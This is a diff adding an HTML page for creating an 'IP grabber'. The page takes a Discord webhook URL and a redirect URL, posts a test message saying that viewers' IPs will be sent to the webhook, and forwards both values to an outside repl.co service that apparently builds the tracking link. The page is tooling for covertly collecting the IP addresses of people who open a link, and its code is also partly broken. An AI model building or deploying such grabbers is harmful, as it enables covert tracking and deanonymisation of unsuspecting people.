@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Create Grabber</title>
+</head>
+<body>
+  <style>
+    body {
+   text-align: center;
+}
+
+* {
+  transition: all .2s ease;
+}
+
+textarea {
+  resize: none;
+}
+
+.extra-info {
+  display: none;
+  line-height: 30px;
+  font-size: 12px;
+	position: absolute;
+  top: 0;
+  left: 50px;
+}
+
+.info:hover .extra-info {
+  display: block;
+}
+
+.info {
+  font-size: 20px;
+  padding-left: 5px;
+  width: 20px;
+  border-radius: 15px;
+}
+
+.info:hover {
+  background-color: white;
+  padding: 0 0 0 5px;
+  width: 315px;
+  text-align: left !important;
+}
+  </style>
+  <h1>Create your IP grabber</h1>
+  <br>
+ <ul>
+    <li style="display:inline-block;">
+        Webhook URL
+    </li>
+    <li style="display:inline-block;">
+      <link href="https://netdna.bootstrapcdn.com/font-awesome/3.2.1/css/font-awesome.css" rel="stylesheet">
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css">
+<div class="col-md-12">
+    <div class="info">
+      <i class="icon-info-sign"></i>
+
+      <span class="extra-info">
+        Currently only Discord webhooks are accepted.
+      </span>
+    </div>
+    </li>
+</ul>
+  <input type="text" id="hook" placeholder="Input Webhook Link Here">
+  <br>
+  <br>
+ <ul>
+    <li style="display:inline-block;">
+        Redirect URL
+    </li>
+    <li style="display:inline-block;">
+<div class="col-md-12">
+    <div class="info">
+      <i class="icon-info-sign"></i>
+
+      <span class="extra-info">
+        This is optional.
+      </span>
+    </div>
+    </li>
+</ul>
+  <input type="text" id="redirect" placeholder="Input Redirect Link Here">
+<br><br>
+<script>
+function create() {
+
+      var request = new XMLHttpRequest();
+      request.open("POST", document.getElementById('hook').text);
+
+      request.setRequestHeader('Content-type', 'application/json');
+
+      var params = {
+        content: "XYZ Grabber connected to this webhook succesfully\n\nIPs of your link's viewers will be sent here."
+      }
+
+      request.send(JSON.stringify(params));
+
+      if (request.status == 200) {
+
+        alert('The webhook you have entered seems to be invalid')
+
+      } else {
+        var hook_encode = encodeURI(document.getElementById('hook').text);
+        var redirect_encode = encodeURI(document.getElementById('redirect').text);
+        window.location.replace('https://xyz.webhooks.repl.co/create?hook=' + hook_encode + '&redirect=' + redirect_encode)
+      }
+}
+</script>
+<button type="button" onclick="create()" style="width:50%;">Create</button>
+</body>
+</html>
